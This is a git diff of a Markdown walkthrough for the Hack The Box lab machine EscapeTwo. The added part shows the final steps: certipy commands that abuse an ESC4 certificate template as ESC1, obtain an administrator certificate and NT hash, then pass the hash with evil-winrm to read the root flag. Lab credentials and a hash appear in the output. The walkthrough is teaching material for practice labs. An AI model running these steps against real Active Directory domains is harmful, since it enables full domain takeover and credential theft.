@@ -791,6 +791,10 @@ SMB         10.10.11.51     445    DC01             [+] sequel.htb\ca_svc:Passwo
 
 <br />
 
+## ADCS Enumeration:
+
+<br />
+
 This user is part of the `Cert Publishers` group:
 
 <br />
@@ -918,9 +922,15 @@ Certificate Templates
 
 The template is `DunderMifflinAuthentication` and it's vulnerable to `ESC4`.
 
+<br />
+
+## From ESC4 to ESC1:
+
+<br />
+
 This is a highly critical vulnerability, as it allows an attacker to modify template configurations and make the template vulnerable to other bugs, like `ESC1`.
 
-[This POST](https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/) explains very well this scenario.
+[This POST](https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/) explains this scenario very well.
 
 We can change the template configuration with this `certipy` one-liner:
 
@@ -937,7 +947,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 <br />
 
-After doing this, if we list vulnerable templates again, we should see the same template, now vunerable to `ESC1`:
+After doing this, if we list vulnerable templates again, we should see the same one, now vulnerable to `ESC1`:
 
 <br />
 
@@ -1013,3 +1023,77 @@ Certificate Templates
 
 <br />
 
+Then we can request a domain administrator certificate:
+
+<br />
+
+```bash
+❯ certipy req -ca sequel-DC01-CA -u ca_svc -p Password123! -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 5
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+<br />
+
+And use it to get the administrator `NTLM` hash with certipy `auth` flag:
+
+<br />
+
+```bash
+❯ certipy auth -pfx administrator.pfx
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+```
+
+<br />
+
+Finally, we can connect to the system as `administrator`:
+
+<br />
+
+```bash
+❯ evil-winrm -i sequel.htb -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+sequel\administrator
+```
+
+<br />
+
+To get the `root.txt` flag:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+8538ce5d9f76d705bf323dbeeaxxxxxx
+```
+
+<br />
+
+EscapeTwo machine pwned!
+
+Hope you learned a lot and enjoyed this writeup.
+
+Keep hacking!❤️❤️
+
+<br />
